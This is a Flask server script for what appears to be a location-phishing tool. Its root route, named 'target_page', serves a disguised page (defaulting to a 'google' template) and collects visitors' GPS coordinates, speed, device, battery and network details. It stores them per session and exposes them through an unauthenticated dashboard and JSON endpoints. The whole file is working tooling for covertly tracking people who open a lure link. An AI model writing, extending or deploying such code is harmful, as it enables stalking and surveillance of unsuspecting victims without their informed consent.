from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# =============================================
# DATA STORAGE — Multi-User Support
# =============================================

users = {}  # { session_id: { "current": {...}, "history": [...] } }
all_history = []

# Fallback location (for backward compatibility)
latest_location = {
    "lat": None, "lng": None, "accuracy": None,
    "altitude": None, "heading": None, "speed": None,
    "timestamp": None, "device_info": None,
    "battery": None, "network": None
}

# =============================================
# ROUTES
# =============================================

@app.route('/')
def target_page():
    template = request.args.get('template', 'google')
    return render_template('index.html', template=template)

@app.route('/send-location', methods=['POST'])
def receive_location():
    global users, all_history, latest_location

    data = request.get_json()
    session_id = data.get('session_id')
    
    if not session_id:
        session_id = request.remote_addr or 'unknown'
    
    location_data = {
        "lat": data.get('lat'),
        "lng": data.get('lng'),
        "accuracy": data.get('accuracy'),
        "altitude": data.get('altitude'),
        "heading": data.get('heading'),
        "speed": data.get('speed'),
        "device_info": data.get('device_info'),
        "battery": data.get('battery'),
        "network": data.get('network'),
        "timestamp": datetime.now().isoformat(),
        "session_id": session_id
    }

    # Store per user
    if session_id not in users:
        users[session_id] = {"current": location_data, "history": []}
    else:
        users[session_id]["current"] = location_data
    
    users[session_id]["history"].append(location_data)
    if len(users[session_id]["history"]) > 50:
        users[session_id]["history"] = users[session_id]["history"][-50:]

    # Store in global history
    all_history.append(location_data)
    if len(all_history) > 200:
        all_history = all_history[-200:]

    # Update fallback
    latest_location = location_data

    print(f"📍 Location from {session_id}: {location_data}")
    print(f"👥 Total users: {len(users)}")

    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/send-battery', methods=['POST'])
def receive_battery():
    data = request.get_json()
    session_id = data.get('session_id')
    if session_id and session_id in users:
        users[session_id]["current"]["battery"] = data
    return jsonify({"status": "ok"})

@app.route('/send-network', methods=['POST'])
def receive_network():
    data = request.get_json()
    session_id = data.get('session_id')
    if session_id and session_id in users:
        users[session_id]["current"]["network"] = data
    return jsonify({"status": "ok"})

@app.route('/get-location')
def get_location():
    return jsonify(latest_location)

@app.route('/get-users')
def get_users():
    """Return all users and their current locations"""
    user_list = []
    for sid, data in users.items():
        user_list.append({
            "session_id": sid,
            "lat": data["current"].get("lat"),
            "lng": data["current"].get("lng"),
            "accuracy": data["current"].get("accuracy"),
            "device_info": data["current"].get("device_info"),
            "timestamp": data["current"].get("timestamp"),
            "battery": data["current"].get("battery"),
            "network": data["current"].get("network")
        })
    return jsonify(user_list)

@app.route('/get-all-history')
def get_all_history():
    return jsonify(all_history)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/clear', methods=['POST', 'GET'])
def clear_location():
    global users, all_history, latest_location
    users = {}
    all_history = []
    latest_location = {
        "lat": None, "lng": None, "accuracy": None,
        "altitude": None, "heading": None, "speed": None,
        "timestamp": None, "device_info": None,
        "battery": None, "network": None
    }
    return jsonify({"status": "cleared"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=True)